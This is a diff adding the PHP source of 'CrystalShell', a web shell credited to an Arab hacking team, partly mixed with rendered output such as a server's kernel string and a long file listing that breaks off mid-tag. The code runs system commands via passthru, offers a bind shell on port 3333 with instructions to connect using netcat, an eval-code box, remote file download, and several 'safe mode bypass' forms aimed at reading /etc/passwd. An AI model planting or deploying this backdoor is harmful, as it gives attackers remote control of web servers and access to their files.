@@ -1,0 +1,465 @@
+<?
+
+
+
+
+error_reporting(5);
+@ignore_user_abort(true);
+@set_magic_quotes_runtime(0);
+$win = strtolower(substr(PHP_OS, 0, 3)) == "win";
+/**********************************************************/
+/*                          CrystalShell v.1
+/*                       --------- ----------
+/*
+/*       Coded by : Super-Crystal and Mohajer22
+/*    ------------------------------------------------
+/*    Arab Security Center Team <---thanks
+/*      mail : sup3r-hackers@hotmail.Com
+/* october73 shell & CrystalShell < coding by super crystal
+/*
+/*********************************************************/
+?>
+<?$dir=realpath("./")."/";
+$dir=str_replace("\\","/",$dir);
+?>
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256"><meta http-equiv="Content-Language" content="ar-sa"><title>
+Crystal shell</title>
+ <style>
+   td {
+   font-family: verdana, arial, ms sans serif, sans-serif;
+   font-size: 11px;
+   color: #D5ECF9;
+   }
+   BODY {
+   margin-top: 4px;
+   margin-right: 4px;
+   margin-bottom: 4px;
+   margin-left: 4px;
+   scrollbar-face-color: #b6b5b5;
+   scrollbar-highlight-color: #758393;
+   scrollbar-3dlight-color: #000000;
+   scrollbar-darkshadow-color: #101842;
+   scrollbar-shadow-color: #ffffff;
+   scrollbar-arrow-color: #000000;
+   scrollbar-track-color: #ffffff;
+   }
+   A:link {COLOR:blue; TEXT-DECORATION: none}
+   A:visited { COLOR:blue; TEXT-DECORATION: none}
+   A:active {COLOR:blue; TEXT-DECORATION: none}
+   A:hover {color:red;TEXT-DECORATION: none}
+   input, textarea, select {
+   background-color: #EBEAEA;
+   border-style: solid;
+   border-width: 1px;
+   font-family: verdana, arial, sans-serif;
+   font-size: 11px;
+   color: #333333;
+   padding: 0px;
+   }
+  </style></head>
+<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style="color:#DCE7EF">
+<center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr>
+	<th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2" bgcolor="#000000">
+<p align="center">&nbsp;</p>
+	<p align="center">
+<a bookmark="minipanel">
+	<font face="Webdings" size="7" color="#DCE7EF">ِ</font></a><font size="7" face="Martina">CRYSTAL-H</font><span lang="en-us"><font size="3" face="Martina"> </font>
+	<font size="1" face="Arial">Crystal hack shellphp</font></span><font color="#FFFF00" face="Arial" size="1">&nbsp;<span lang="en-us">2006-2007</span>&nbsp;&nbsp;&nbsp;&nbsp; </font>
+<font color="#FFFF00" face="Arial" size="7"><span lang="en-us">0.2</span></font></p>
+</p>
+<a bookmark="minipanel">
+<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+<p align="center">
+	<b>
+	<?
+	$dirfile="$file_to_download";
+if (file_exists("$dirfile"))
+{
+header("location: $dirfile");
+}
+if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
+{
+ $safemode = true;
+ $hsafemode = "<font color=\"red\">ON (secure)</font>";
+
+
+}
+
+else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
+echo("Safe-mode: $hsafemode");
+// PHPINFO
+if ($_GET['action'] == "phpinfo") {
+	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() b&#7883; c&#7845;m";
+	exit;
+}
+$v = @ini_get("open_basedir");
+if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
+else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}
+echo("<br>");
+echo("Open base dir: $hopenbasedir");
+echo("<br>");
+echo "PostgreSQL: <b>";
+$pg_on = @function_exists('pg_connect');
+if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
+echo("<br>");
+echo "MSSQL: <b>";
+$mssql_on = @function_exists('mssql_connect');
+if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
+echo("<br>");
+echo "MySQL: <b>";
+$mysql_on = @function_exists('mysql_connect');
+if($mysql_on){
+echo "<font color=green>ON</font></b>"; } else { echo "<font color=red>OFF</font></b>"; }
+echo("<br>");
+echo "PHP version: <b>".@phpversion()."</b>";
+echo("<br>");
+echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));
+
+echo("<br>");
+echo "Disable functions : <b>";
+if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
+$free = @diskfreespace($dir);
+if (!$free) {$free = 0;}
+$all = @disk_total_space($dir);
+if (!$all) {$all = 0;}
+$used = $all-$free;
+$used_percent = @round(100/($all/$free),2);
+
+?>
+</b></p>
+	<p align="center">&nbsp;</p></td></tr></table>
+<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+	<b>
+</b></p>
+	<p align="center">&nbsp;</p></td></tr></table>
+
+</a>
+
+
+
+</p>
+	<p align="center"><font color="#FFFF00">&nbsp;</font></p>
+	<p align="center"></p>
+	</th></tr><tr>
+		<td bgcolor="#000000" style="color: #DCE7EF">
+<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+<font size="4px">
+<b>
+		<font size="1" face="Verdana" color="#DCE7EF">OS:</font><font color="#DCE7EF" size="-2" face="verdana"><font size="1" face="Arial">&nbsp;Linux cj-pc 4.15.0-76-generic #86~16.04.1-Ubuntu SMP Mon Jan 20 11:02:50 UTC 2020 x86_64&nbsp;</font></span></font></b><p>
+<font size="1" face="Verdana" color="#DCE7EF">Server:</font><font color="#DCE7EF" size="1" face="Arial">&nbsp;</font><font color="#DCE7EF" size="1" face="Arial">&nbsp;</font></font>
+</font>
+</p>
+</font>
+<font size=1 face=Verdana>
+<p align="left"><font color="#DCE7EF">User</font></font><font size="1" face="Verdana" color="#DCE7EF">:</font><font size=-2 face=verdana color="#00000"> </font>
+</b>
+	</font>
+	</font>
+	<a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none">
+<font size=-2 face=verdana color="#FFFFFF">
+<? passthru("id");?></font><font size=-2 face=verdana color="black"><br>
+	</font>
+</a><span lang="en-us"><font face="Wingdings" size="3" color="#FFFFFF">1</font></span><a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none"><font size="-2" face="verdana"><font size=-2 face=Verdana color="#DCE7EF">:</font><font size=-2 face=verdana color="#DCE7EF">
+<? echo getcwd();?></div></font></font></a></font></b></a></font><br>
+
+<br>&nbsp;<b><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font size="4px"><font color="#FF0000" face="Verdana" size="-2">
+</font></font><font color="#FF0000" face="Verdana" size="2">
+&nbsp;</font></a><font size=2 face=verdana></a></font><font face="Verdana" size="2">&nbsp;</font><a href=# onClick=location.href="javascript:history.back(-1)" style="color: white; text-decoration: none"><font face=Verdana><font color="#CC0000" size="1" face="verdana">Back</font><font color="#DCE7EF" size="1" face="verdana"> </font>
+
+	</font></a><font face="Wingdings" size="1" color="#C0C0C0">ً</font><span lang="en-us"><font size="1" color="#C0C0C0" face="Webdings">
+</font></span><font face=Verdana color="white"><font color="#CC0000" size="1"><a target="\&quot;_blank\&quot;" style="text-decoration: none" title="معلومات الـPhp" href="?action=phpinfo"><font color="#CC0000">phpinfo</font></a></font><font size="1"></a></font></font></b><span lang="en-us"><font color="#C0C0C0" face="Wingdings" size="1">2</font></span><b><font size=1 face=verdana>
+</font>
+<font size="4px" face="verdana" color="white">
+<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+<font color=#DCE7EF face="Verdana" size="1">&nbsp;</font></font><font face="verdana" color="white"><span lang="en-us"><a title="الأدوات" href="?act=tools"><font color=#CC0000 size="1">Tools</font></a></span></font><a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none"><span lang="en-us"><font color=#C0C0C0 face="Wingdings 2" size="1">4</font></span></a><font size="1" face="verdana" color="white"></a></font><font size=1 face=verdana>
+</font>
+<font size="4px" face="verdana" color="white">
+<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+<font color=#DCE7EF face="Verdana" size="1"><span lang="en-us">&nbsp;</span> </font></font>
+<font face="verdana" color="white"><span lang="en-us">
+<a title="التشفير" href="?act=decoder"><font color=#CC0000 size="1">Decoder</font></a></span></font><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><span lang="en-us"><font color=#C0C0C0 face="Webdings" size="1">i</font></span></a><font size="1" face="verdana" color="white"></a></font><font size=1 face=verdana>
+</font>
+<font size="4px" face="verdana" color="white">
+<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+<font color=#DCE7EF face="Verdana" size="1"><span lang="en-us">&nbsp;</span> </font>
+	</font><span lang="en-us"><font face="verdana" color="white">
+	<font color=#CC0000 size="1">
+<a title="ثغرات المرور" href="?act=bypass"><font color="#CC0000">ByPass</font></a></font><font size="1"></a></font></font><font face="Webdings" size="1" color="#C0C0C0">`</font></span><font size="1" face="verdana" color="white"></a></font><font size=1 face=verdana>
+</font>
+<font size="4px" face="verdana" color="white">
+<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+<font color=#DCE7EF face="Verdana" size="1"><span lang="en-us">&nbsp;</span> </font>
+	</font><font face="verdana" color="white"><span lang="en-us">
+<a title="الإتصال بقاعدة البيانات" href="?act=SQL"><font color=#CC0000 size="1">SQL</font></a></span></font></b><font face="Webdings" size="1" color="#C0C0C0">آ</font><b><font size="1" face="verdana" color="white"></a></font></b><font size="1"></font></font><b><font size=1 face=verdana>
+</font></b><font size="4px"><b>
+<font size="4px" face="verdana" color="white">
+<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+<font color=#DCE7EF face="Verdana" size="1"><span lang="en-us">&nbsp;</span></font></font></b></font><b><span lang="en-us"><font face="verdana" color="white"><a title="bind shell" href="?act=bindport"><font color=#CC0000 size="1">Bind</font></a></font></span></b><font face="Webdings" size="1" color="#C0C0C0">آ</font><font size="4px"><b><font size="4px" face="verdana" color="white"><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font color=#DCE7EF face="Verdana" size="1"> </font>
+	</font></b></font><font face="verdana" color="white">
+	<b>
+	<span lang="en-us"><font color=#CC0000 size="1">
+<a title="المساعدة" href="?act=help"><font color="#CC0000">help</font></a></font></span><font size="1"></a></font></b></font><b><font size="1"></a></font><font size=1 face=verdana>
+</font><span lang="en-us"><font color="#C0C0C0" face="Webdings" size="1">s</font></span><font face="verdana" color="white"><span lang="en-us"><font color=#CC0000 size="1"><a title="اقراءني" href="?act=about"><font color="#CC0000">about</font></a></font></span><font size="1"></a></font></font><font size="1"></a></font><font size=1 face=verdana>
+</font></b><span lang="en-us"><font size=1 face=Wingdings color="#C0C0C0">
+?</font></span></p>
+<p><font size="4px"><font size=-2 face=verdana color=white><font size="4px" face="Verdana" color="white"><a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none"><font color=#DCE7EF face="Verdana" size="-2">
+[</font></a></font><a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none"><font face="Webdings" color="#DCE7EF">j</font></a><font color=#CC0000 face="Verdana" size="-2"> </font>
+
+<font size="4px">
+	<font size="4px" face="verdana" color="white"><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+	<font size=-2 face=verdana color=#CC0000>server </font>
+	<font size="1" face="verdana" color="#CC0000">:</font><font face=Verdana size=-2 color="#DCE7EF"> 	</font></a></font>
+</a></font>
+</font><b>
+<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+<font color=#DCE7EF size="-2" face="verdana">]&nbsp; </font>
+<font size=-2 face=verdana color=white>
+	<font size="4px" face="verdana" color="white">
+	<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+	<font face=Verdana size=-2 color="#008000">
+	CGI v</font><font size="1" face="verdana" color="#DCE7EF">:</font><font face=Verdana size=-2 color="#DCE7EF"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font>
+	<font face=Verdana size=-2 color="#008000">&nbsp;HTTP v</font></a></font><font size="1" face="verdana">:</font><font size="4px" face="verdana" color="DCE7EF"><font face=Verdana size=-2> </font><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font face=Verdana size=-2><font size=-2 face=verdana color=#DCE7EF>&nbsp;</font><font size=-2 face=verdana color=#008000>Mail
+admin</font></font><font size="1" face="verdana" color="#DCE7EF">:</font><font face=Verdana size=-2 color="#DCE7EF"> &nbsp;&nbsp;&nbsp;&nbsp; </font><font face=Verdana size=-2 color="black"> &nbsp; </font></a></font>
+</font>
+	</b>
+</font></a>&nbsp;&nbsp;<br>
+
+<font size="4px">
+<b>
+<font size=-2 face=verdana color=white>
+	<font face=Verdana size=-2 color="#CC0000">
+	<a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none">
+	<font face="Wingdings" size="3" color="#000000">:</font></a></font><font size=-2 face=verdana color=#CC0000>&nbsp;&nbsp;</font><font face="Verdana" size="-2" color="#CC0000">IP</font><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font size="4px" face="verdana" color="white"><font face=Verdana size=-2>
+	</font><font size="1" face="verdana">&nbsp;</font></font><font size="1" face="verdana" color="#CC0000">SERVER:</font><font face=Verdana size=-2 color="#DCE7EF"> 	</font>
+	</a>
+
+<font size="4px">
+</a>
+<font size=-2 face=verdana color=white>
+
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</font></font>
+	<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+	<font size="4px"><font face=Verdana size=-2 color="black">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+	</font>
+	<font size="4px" face="verdana" color="white"><font face=Verdana size=-2 color="#008000">
+port
+	</font><font size="1" face="verdana" color="#000000">:</font><font face=Verdana size=-2 color="red"> 	</font></font>
+	</font>
+	</font>
+	</b>
+</font></p></td></tr></table>
+<?
+if ($act == "help") {echo "<center><b>السلام عليكم ورحمة الله وبركاته<br><br>عزيزي المستخدم<br>اذا اردت المساعدة اضغط على اسم الخيار الموضح باللون الازرق<br>وستظهر لك معلومات الخيار   </a>.</b>";}
+if ($act == "bindport"){
+echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
+<b>/bin/bash</b><input type=\"text\" name=\"installpath\" value=\"" . getcwd() . "\">
+<b>Port</b><input type=\"text\" name=\"port\" value=\"3333\">
+<INPUT type=\"hidden\" name=\"installbind\" value=\"yes\">
+<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
+<INPUT type=\"submit\" value=\"Connect\"></form></div>";
+}
+if ($act == "tools"){
+	echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
+File to edit:
+<input type=\"text\" name=\"editfile\" >
+<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
+<INPUT type=\"submit\" value=\"Edit\"></form></div>";
+ echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
+<table id=tb><tr><td>
+<INPUT type=\"hidden\" name=\"php\" value=\"yes\">
+<INPUT type=\"submit\" value=\"eval code\" id=input></form></div></td></table>";
+echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+<table id=tb><tr><td>Download here <b>from</b>:
+<INPUT type=\"text\" name=\"filefrom\" size=30 value=\"http://\">
+<b>-->>:</b>
+<INPUT type=\"text\" name=\"fileto\" size=30>
+<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\"></td><td>
+<INPUT type=\"submit\" value=\"Download\" id=input></td></tr></table></form></div>";
+}
+if ($act == "about") {echo "<center><b>Coding by:<br><br>Super-Crystal<br>&<br>Mohajer22<br>-----<br>Thanks <br>TrYaG Team <br> ArabSecurityCenter Team <br>CRYSTAL-H Version:0 Beta phpshell code<br>Saudi Arabic  </a>.</b>";}
+
+if ($act == "bind") {echo "<center><b>CRYSTAL-H:<br><br>-Connect قم بالضغط على خيار.<br>.- بعد مايتم انزال السكريبت بالمجلد<br>.-توجه لاداة النت كات وتصنت على<br>nc -lp 3333بكتابة المنفذ - <br>السكريبت بلغة البيرل <br>Bind port to  :<br> bind shell وهنيئا ً لك   </a>.</b>";}
+
+if ($act == "command") {echo "<center><b>CRYSTAL-H:<br><br>لأختيار الاوامر الجاهزه  Select ------ x  اضغط على الخيار<br>.- واذا اردت كتابه  الاوامر بنفسك قد تكتفي بالخيار<br>Command   </a>.</b>";}
+
+if ($act == "team") {echo "<center><b>Arab Security Center Team<br><br>Super-Crystal<br>Medo-HaCKer<br>Anaconda<br>Alsb0r<br> ReeM-HaCK <br>NoOFa <br> AL-Alame<br>The YounG HackeR<br>Anti-Hack<br>Thanks  </a>.</b>";}
+if (array_key_exists('image', $_GET)) {
+	header('Content-Type: image/gif');
+	die(getimage($_GET['image']));
+}
+
+if ($act == "bypass") {
+echo "
+<form action=\"$REQUEST_URI\" method=\"POST\">
+<table id=tb><tr><td>Execute:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\"></td></tr></table>
+";
+echo ("<FONT COLOR=\"RED\"> bypass safemode with copy </FONT>");
+echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+<table id=tb><tr><td>read file :
+<INPUT type=\"text\" name=\"copy\" size=30 value=\"/etc/passwd\">
+<INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
+echo ("<FONT COLOR=\"RED\"> bypass safemode with CuRl</FONT>");
+echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+<table id=tb><tr><td>read file :
+<INPUT type=\"text\" name=\"curl\" size=30 value=\"/etc/passwd\">
+<INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
+echo ("<FONT COLOR=\"RED\"> bypass safemode with imap()</FONT>");
+echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+<table id=tb><tr><td><select name=switch><option value=file>View file</option><option value=dir>View dir</option></select>
+<INPUT type=\"text\" name=\"string\" size=30 value=\"/etc/passwd\">
+<INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
+echo ("<FONT COLOR=\"RED\"> bypass safemode with id()</FONT>");
+echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+<table id=tb><tr><td>
+<select name=plugin><option>cat /etc/passwd</option></select>
+<INPUT type=\"submit\" value=\"Show\" id=input></td></tr></table></form></div>";
+echo ("<FONT COLOR=\"RED\"> Exploit: error_log()</FONT>");
+echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+<table id=tb><tr><td>
+<INPUT type=\"text\" name=\"ERORR\" size=30 value=\"\">
+<INPUT type=\"submit\" value=\"Write\" id=input></td></tr></table></form></div>";
+}
+if ($act == "decoder"){
+echo ("<FONT COLOR=\"RED\"> replace Chr()</FONT>");
+echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+<table id=tb><tr><td>
+<textarea name=\"Mohajer22\" cols=\"50\" rows=\"15\" wrar=\"off\">
+</textarea><br>
+<INPUT type=\"submit\" value=\"Replace\" id=input></td></tr></table></form></div>";
+}
+if ($act == "SQL"){
+echo ("<FONT COLOR=\"RED\">   MySQL    </FONT>");
+echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+<table id=tb><tr><td> Username :
+<INPUT type=\"text\" name=\"username\" size=30 value=\"\">\n
+password :
+<INPUT type=\"password\" name=\"password\" size=30 value=\"\">\n
+<input type=submit value='Enter'>\n
+<input type=reset value='Clear'></td></tr></table></form></div>";
+}
+?>
+
+
+
+<br>
+<TABLE style="BORDER-COLLAPSE: collapse; color:#000000" cellSpacing=0 borderColorDark=#DCE7EF cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#C0C0C0 border=1><tr>
+	<td width="100%" valign="top" style="color: #00000" bgcolor="#000000">
+	<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
+	<TABLE style="BORDER-COLLAPSE: collapse; font-family:Verdana; font-size:11px; color:#000000; background-color:#0000000" height=1 cellSpacing=0 borderColorDark=#000000 cellPadding=0 width="100%" bgColor=#000000 borderColorLight=#DCE7EF border=1>
+	<tr style="font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: red; background-color: #0000000">
+	<td width="990" height="1" valign="top" style="border:1px solid #00000; font-family: Verdana; color: #000000; font-size: 11px; "><p align="center">
+	&nbsp;</p>
+	<p align="center">&nbsp;<table style="font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: red; background-color: #0000000">
+		<tr style="font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: red; background-color: #0000000">
+			<td style="font-size: 13px; font-family: verdana, arial, helvetica; color: red; background-color: #0000000">
+<table><tr><td>Name</td><td><a title="Type of object">Type</a></td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td><a title="If Yes, you have write permission">Write</a></td><td><a title="If Yes, you have read permission">Read</a></td></tr><tr><td><a onclick=tag('1.php')>1.php</a></td><td>file</td><td>19979</td><td>17:41 14 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('10.php')>10.php</a></td><td>file</td><td>3883</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('11.php')>11.php</a></td><td>file</td><td>38743</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('12.php')>12.php</a></td><td>file</td><td>3335</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('13.php')>13.php</a></td><td>file</td><td>6243</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('14.php')>14.php</a></td><td>file</td><td>7355</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('15.php')>15.php</a></td><td>file</td><td>58307</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('16.php')>16.php</a></td><td>file</td><td>11011</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('17.php')>17.php</a></td><td>file</td><td>54135</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('18.php')>18.php</a></td><td>file</td><td>17423</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('19.php')>19.php</a></td><td>file</td><td>20735</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('2.php')>2.php</a></td><td>file</td><td>148595</td><td>17:41 14 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('20.php')>20.php</a></td><td>file</td><td>23323</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('21.php')>21.php</a></td><td>file</td><td>19531</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('22.php')>22.php</a></td><td>file</td><td>121715</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('23.php')>23.php</a></td><td>file</td><td>79463</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('24.php')>24.php</a></td><td>file</td><td>6979</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('25.php')>25.php</a></td><td>file</td><td>89691</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('26.php')>26.php</a></td><td>file</td><td>131363</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('27.php')>27.php</a></td><td>file</td><td>62395</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('28.php')>28.php</a></td><td>file</td><td>54643</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('29.php')>29.php</a></td><td>file</td><td>57895</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('3.php')>3.php</a></td><td>file</td><td>20659</td><td>17:41 14 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('30.php')>30.php</a></td><td>file</td><td>7383</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('31.php')>31.php</a></td><td>file</td><td>13383</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('32.php')>32.php</a></td><td>file</td><td>3343</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('33.php')>33.php</a></td><td>file</td><td>18475</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('34.php')>34.php</a></td><td>file</td><td>17839</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('35.php')>35.php</a></td><td>file</td><td>26471</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('36.php')>36.php</a></td><td>file</td><td>51007</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('37.php')>37.php</a></td><td>file</td><td>5103</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('38.php')>38.php</a></td><td>file</td><td>31523</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('39.php')>39.php</a></td><td>file</td><td>421295</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('4.php')>4.php</a></td><td>file</td><td>11063</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('40.php')>40.php</a></td><td>file</td><td>225683</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a onclick=tag('41.php')>41.php</a></td><td>file</td><td>739587</td><td>23:42 16 Feb 2020</td><td>19:45 4 Jan 2018</td><td>-rw-r--r--<td>Yes</td><td>Yes</td></td></tr><tr><td><a 